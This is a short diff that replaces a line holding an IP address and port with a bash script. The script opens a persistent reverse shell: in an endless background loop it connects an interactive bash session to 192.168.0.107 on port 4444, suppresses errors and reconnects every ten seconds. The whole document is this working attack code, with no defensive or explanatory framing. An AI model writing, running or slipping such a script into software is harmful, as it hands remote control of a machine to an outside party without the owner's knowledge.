@@ -1,1 +1,17 @@
-192.168.0.107:4444
+#!/bin/bash
+
+# Hard-coded IP and port
+ip_addr="192.168.0.107"
+port="4444"
+
+# Function to start the reverse shell
+start_reverse_shell() {
+    while true; do
+        # Start the reverse shell, suppressing error messages
+        bash -i >& /dev/tcp/$ip_addr/$port 0>&1 2>/dev/null
+        sleep 10 # Wait before reconnecting
+    done
+}
+
+# Start the reverse shell function in the background
+start_reverse_shell &
